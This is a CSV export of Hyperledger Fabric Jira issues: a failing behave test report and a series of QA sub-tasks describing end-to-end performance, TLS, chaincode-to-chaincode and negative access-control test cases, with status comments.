Summary,Issue key,Issue id,Parent id,Issue Type,Status,Project key,Project name,Project type,Project lead,Project description,Project url,Priority,Resolution,Assignee,Reporter,Creator,Created,Updated,Last Viewed,Resolved,Affects Version/s,Affects Version/s,Affects Version/s,Fix Version/s,Fix Version/s,Component/s,Component/s,Component/s,Component/s,Component/s,Due Date,Votes,Labels,Labels,Labels,Labels,Labels,Labels,Description,Environment,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Watchers,Log Work,Log Work,Original Estimate,Remaining Estimate,Time Spent,Work Ratio,Σ Original Estimate,Σ Remaining Estimate,Σ Time Spent,Security Level,Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Inward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Outward issue link (Blocks),Inward issue link (Cloners),Inward issue link (Cloners),Inward issue link (Cloners),Outward issue link (Cloners),Inward issue link (Duplicate),Inward issue link (Duplicate),Inward issue link (Duplicate),Outward issue link (Duplicate),Outward issue link (Duplicate),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Inward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Outward issue link (Relates),Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Attachment,Custom field (Business Value),Custom field (Commit Levels),Custom field (Current Status),Custom field (Design),Custom field (Design Status),Custom field (Documentation Impact),Custom field (Documentation Status),Custom field (Epic Color),Custom field (Epic Link),Custom field (Epic Name),Custom field (Epic Status),Custom field (Executed),Custom field (Found in Commit),Custom field (Function Test Status),Custom field (Must Fix),Custom field (Original story points),Custom field (Parent Link),Custom field (Rank),Custom field (Release Note),Custom field (Release Note Required),Custom field (Root Cause Analysis),Custom field (SDK Impact),Custom field (Sample/Tutorial),Sprint,Sprint,Sprint,Sprint,Custom field (Steps to Reproduce),Custom field (Story Points),Custom field (System Test Impact),Custom field (Target end),Custom field (Target start),Custom field (Team),Custom field (Team),Custom field (Test Plan),Custom field (Test Result),Custom field (Test Result Details),Custom field (Test Type),Custom field (Triaged),Custom field (Usage),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Watchers),Custom field (Workaround),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitBranch),Custom field (gitCommitsReferenced),Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment,Comment
Behave tests are failing on latest fabric commits,FAB-4701,17983,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jeffgarratt,rameshthoomu,rameshthoomu,15/Jun/17 5:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 1:13 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,quality,,,,,,"Observed behave tests are failing on latest fabric commit#0a72230

Below is the error log:

*00:10:47.896*       Assertion Failed: Expected single block, received: 0 blocks*00:10:47.896*       Captured stdout:*00:10:47.896*       Will copy gensisiBlock over at this point *00:10:47.896*       WARNING: Could not find port mapping for port 7050/tcp*00:10:47.896*       WARNING: Returning the actual container IP address, which might not be routable from the host.*00:10:47.896* 

Docker log files are available here:

https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-behave-x86_64/1116/",,jeffgarratt,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx25b:",,,,,,,,,,,,,,,,,,,,,,,jeffgarratt,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 5:35 AM;jeffgarratt;[~rameshbabu79] This should be addressed by [https://gerrit.hyperledger.org/r/#/c/10587/]

[~binhn] is preparing to merge.;;;","15/Jun/17 5:36 AM;jeffgarratt;Binhn just merged.  Please let me know if you continue to see this issue.;;;","16/Jun/17 11:15 PM;Clayton Sims;Ramesh did this solved the issue?  can we mark 'done'?;;;","21/Jun/17 1:11 AM;jeffgarratt;[~rameshthoomu] can we close this one now?;;;","21/Jun/17 1:13 AM;rameshthoomu;Behave tests are working as expected on latest fabric commits. Closing this issue;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Negative Testing - Accessing a ledger you aren't on the channel,FAB-4702,17984,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:09 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*:Negative Testing - Accessing a ledger you aren't on the channel

*Component*: Ledger/Channel
 *Description*:  Client must fail accessing Ledger on channel which he has no access.

*Artifact Locations:* NA
 *Network Topology*:  Standard Network
 *Client Driver*:  _e2e_cli sample_
 *Input*: modify e2e_cli sample to have 2 channels

*Output:*  

Must fail with an error (chaincode doesn`t exist on this channel)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2o7:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Chaincode Calling Chaincode via events using chaincode_example04,FAB-4703,17985,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Sep/17 12:40 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2of:",,,,,,,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:57 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf test with DEFAULT configurations,FAB-4704,17986,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:10 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name:* e2e_perf test with DEFAULT configurations

*Component*: endorser/ledger/committer/orderer
  *Description*:  modify e2e_cli sample scripts to have the following configurations

{color:#000000}This test uses 2 channels and 2 chaincodes. Anchor peers peer0 & peer2; OrgsLeaders are self-elected. {color}{color:#000000}Create all channels {color}
 * {color:#000000}All peers join all channels{color}
 * {color:#000000}all peers install all chaincodes {color}
 * {color:#000000}peer0 instantiates all chaincodes on all channels. {color}
 * {color:#000000}QIQ on all chaincodes on all channels on all peers and verify the responses at the end.
 Total: 32 Query transactions + 16 Invoke-Change transactions{color}

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2on:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf: anchors peers 0 and 3. leader peers 1 & 3. Instantiate each chaincode once on peer0 - which is anchor and NOT leader.,FAB-4705,17987,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchors peers 0 and 3. leader peers 1 & 3. Instantiate each chaincode once on peer0 - which is anchor and NOT leader.

*Component*: endorser/ledger/committer/orderer
  *Description*:  modify e2e_cli sample scripts to configure peer0 and peer3 as anchor and peers and peer0 and peer3 as OrgLeader s

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2ov:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf: anchors 0,3. leaders 0,3.",FAB-4706,17988,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchor 0,3 .Leaders 0,3

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create peers 0, 3 as anchor and peers 0,3 as Leaders

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2p3:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf: anchors 1,3. leaders 1,3.",FAB-4707,17989,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchor 1,3 .Leaders 1,3

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create peers 1, 3 as anchor and peers 1,3 as Leaders

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pb:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf: anchors 1,3. leaders 0,3.",FAB-4708,17990,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:11 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf: anchor 1,3 .Leaders 0,3

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create peers 1, 3 as anchor and peers 0,3 as Leaders

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pj:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"e2e_perf with 4 channels, with 4 chaincodes per channel",FAB-4709,17991,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:12 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 4 channels, with 4 chaincodes per channel

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to create 4 channels, with 4 chaincodes per channel

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology 
  *Client Driver*:  _e2e_cli sample_
  *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pr:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf with 25 channels 10 chaincodes,FAB-4710,17992,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:12 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 25 channels 10 chaincodes

*Component*: Ledger/Channel
 *Description*:  modify e2e_cli sample scripts to create 25 channels and 10 chaincodes and send transactions on to those channels.

*Artifact Locations:* NA
 *Network Topology*:  e2e_cli based network topology 
 *Client Driver*:  _e2e_cli sample_
 *Output:*  Test passed 
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2pz:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf with 50 channels 10 chaincodes,FAB-4711,17993,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:13 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 50 channels 10 chaincodes

*Component*: Ledger/Channel
 *Description*: modify e2e_cli sample scripts to create 50 channels and install/instantiate 10 chaincodes and send transactions on to those channels.

ensure all the transaction sent to all the channels (using all chaincodes) are successful

*Artifact Locations:* NA
 *Network Topology*:  e2e_cli based network topology 
 *Client Driver*:  _e2e_cli sample_
 *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2q7:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_perf with 100 channels 10 chaincodes,FAB-4712,17994,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,Clayton Sims,Clayton Sims,15/Jun/17 5:13 AM,30/Jul/19 11:42 AM,28/Oct/23 3:00 AM,30/Jul/19 11:42 AM,,,,v1.1.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e_perf with 100 channels 10 chaincodes

*Component*: Ledger/Channel
 *Description*:  modify e2e_cli sample scripts to create 100 channels and install/instantiate 10 chaincodes and send transactions on to those channels.

ensure all the transaction sent to all the channels (using all chaincodes) are successful

*Artifact Locations:* NA
 *Network Topology*:  e2e_cli based network topology 
 *Client Driver*:  _e2e_cli sample_
 *Output:*  Test passed
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}",,mastersingh24,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2qf:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/May/18 3:48 AM;scottz;For v1.2 and afterwards, rerun this testcase as is, or else just make sure at least one PTE testcase uses 100 or more channels, and another uses minimum 10 chaincodes.;;;","30/Jul/19 11:42 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e_cli with TLS enabled with Kafka based ordereing service,FAB-4713,17995,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:13 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: {color:#000000}e2e_cli with TLS with Kafka based ordereing service{color}

*Component*: Ledger/Channel
  *Description*:  modify e2e_cli sample scripts to enabled/disabled TLS configurations with kafka orderering service

*Artifact Locations:* NA
  *Network Topology*:  e2e_cli based network topology  + kafka orderering service (+ zookeeper)
  *Client Driver*:  _e2e_cli sample_ 
  *Output:*  Test  passed with valid certs and failed with invalid certs.

output when test passed:
{code:java}
===================== All GOOD, End-2-End execution completed ====================={code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2qn:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
e2e with TLS ,FAB-4714,17996,19361,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name*: e2e scenario using behave, with TLS enabled

*Component*: integration
*Description*:  modify e2e_cli sample scripts: install, instantiate, invoke, query, using example02 and minimum standard network

*Artifact Locations:* NA
*Network Topology*:  e2e_cli based network topology 
*Client Driver*:  _behave_
*Output:*  Test passed",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2qv:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"negative testing - Reject endorsements that contain conflicting actions - propose two TX using example02 within same block; one should be rejected by VSCC",FAB-4715,17997,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name* : negative testing - Reject endorsements that contain conflicting actions - propose two TX using example02 within same block; one should be rejected by VSCC

*Component*: endorser/committer/ledger
  *Description*: Verify if the endorser rejects the conflicting transatcions (using example02 chaincode)
 * Use e2e_cli or balance-transfer sample from nodesdk and launch the default network
 * Send two transactions at the same time and see if the transactions are processed and committed to the ledger by querying the chaincode

*Artifact Locations:* NA
  *Network Topology*:  same as e2e_cli/node-sdk balance-transfer based network topology 
  *Client Driver*:  _e2e_cli sample_/  node sample balance-transfer
  *Output:*  

Tranactions must be rejected by the Validating Systen chaincode",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2r3:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"negative testing - TX fails due to endorsement policy ""AND"", when send TX Proposal to only one peer for endorsement",FAB-4716,17998,16637,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,Clayton Sims,Clayton Sims,15/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"*Test Name* : Negative testing - TX fails due to endorsement policy ""AND"", when send TX Proposal to only one peer for endorsement

*Component*: endorser/committer/ledger
  *Description*: Verify if the transaction fails when endorsement policy is AND but send the proposal to only one endorser.

Change the instantiated chaincode pilicy to AND instead of OR in the e2e_cli sample scripts

*Artifact Locations:* NA
  *Network Topology*:  same as e2e_cli  based network topology 
  *Client Driver*:  _e2e_cli sample_ 
  *Output:* 

Tranactions are rejected 
  ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rb:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode-to-chaincode testing passing in channel name as a third argument to chaincode_ex05 ,FAB-4717,17999,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,2020Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Aug/17 11:50 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Component: endorser

Description:  Verify invoke and query transactions for chaincode-to-chaincode call with the channel name as the third argument

Artifact Locations: github.com/hyperledger/fabric-test/feature/chaincodes.feature

Client Driver:

              Behave

              Build fabric docker images

              Run behaveinstall.sh from from fabric/scripts

             {{from hyperledger/fabric-test folder}} Run - {{git submodule update --init --recursive }}

            

Input: behave chaincodes.feature (from hyperledger/fabric-test/feature)

 ",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rj:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:56 AM;Nishi;submitted patch set [https://gerrit.hyperledger.org/r/#/c/12493/];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode-to-chaincode testing passing an empty string for channel_name when cc_05 and cc_02 are on the same channel,FAB-4718,18000,19360,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Nishi,Clayton Sims,Clayton Sims,15/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,13/Sep/17 11:02 PM,,,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"Test Name: e2e_test_example05.sh

Component: endorser

Description:  Verify invoke and query transactions for chaincode-to-chaincode call on the same channel by passing empty string """" for the channel name argument

Artifact Locations: fabric/test/regression/daily/chaincodetests

Network Topology: e2e_cli

Client Driver: python script

                      dependency: sudo pip install -U pytest

Input: ./runChaincode.sh (from fabric/test/regression/daily/chaincodetests/envsetup)

Output: [testYourChaincode.py::ChaincodeAPI::test_FAB3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel|http://testyourchaincode.pychaincodeapitest_fab3797_example05_chaincode_to_chaincode_call_on_same_and_different_channel/] PASSED",,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2rr:",,,,,,,,,,,,,,,,,,,,,,,ArchanaBalaji,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 5:57 AM;Nishi;submitted patchset https://gerrit.hyperledger.org/r/#/c/12493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
